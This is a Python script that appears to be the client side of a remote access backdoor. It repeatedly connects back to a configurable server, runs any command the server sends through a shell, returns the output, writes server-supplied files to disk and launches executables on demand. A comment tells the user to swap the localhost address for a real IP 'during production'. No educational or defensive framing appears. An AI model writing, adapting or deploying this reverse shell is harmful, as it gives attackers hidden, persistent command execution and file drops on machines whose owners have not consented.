import socket
import subprocess
import sys
import time
import os

# Set IP address and PORT to the server
SERVER_HOST = '127.0.0.1'   # Temporary localhost for testing (Make sure to use the client's IP during production
SERVER_PORT = 21420

# Attemot to connect to server with given IP and PORT every 15 seconds
client = socket.socket()
while True:
    try:
        client.connect((SERVER_HOST, SERVER_PORT))
        break
    except Exception as err:
        print(err)
        time.sleep(15)
        pass
print("Connection has been established!")

# When connection is established
while True:
    print('Connection has been established, awaiting commands from server.')
    # Get commands from the server
    try:
        serverCommand = client.recv(1024)
        serverCommand = serverCommand.decode()
    except Exception as e:
        print(e)
        break
    else:
        # Transfer file by passing path, filesize and data
        if serverCommand == "ft_True":
            pathcommand = client.recv(1024).decode()
            pathInfo = subprocess.Popen(pathcommand, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                                        text=True)
            path = pathInfo.stdout.read()
            filesize = client.recv(1024).decode()
            f = open(file=path.strip(), mode='wb')
            data = client.recv(8192)
            totalRecv = len(data)
            f.write(data)
            while totalRecv < int(filesize):
                data = client.recv(8192)
                totalRecv = totalRecv + len(data)
                f.write(data)
            client.send("Download complete.".encode())
            f.close()
        # Remotely execute a program or executable
        elif serverCommand == "exe_True":
            exeCommand = client.recv(1024).decode()
            subprocess.Popen(exeCommand, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
            client.send(" running.".encode())
        # Open command prompt and insert command given by the server
        else:
            cmdPrompt = subprocess.Popen(serverCommand, shell=True, stdout=subprocess.PIPE,
                                         stderr=subprocess.STDOUT, text=True)
            getOutput = cmdPrompt.stdout.read().encode()
            sendsize = sys.getsizeof(getOutput)
            # Send back the output
            client.send(str(sendsize).encode())

            fw = open(file='temp', mode='wb')
            fw.write(getOutput)
            fw.close()

            f = open(file='temp', mode='rb')
            bytesToSend = f.read(1024)
            client.send(bytesToSend)
            totalSent = len(bytesToSend)
            while totalSent < sendsize:
                bytesToSend = f.read(8192)
                totalSent = totalSent + len(bytesToSend)
                client.send(bytesToSend)
            f.close()
            os.remove('temp')

# client.close()
print(f'[INFO] {SERVER_HOST} disconnected.')


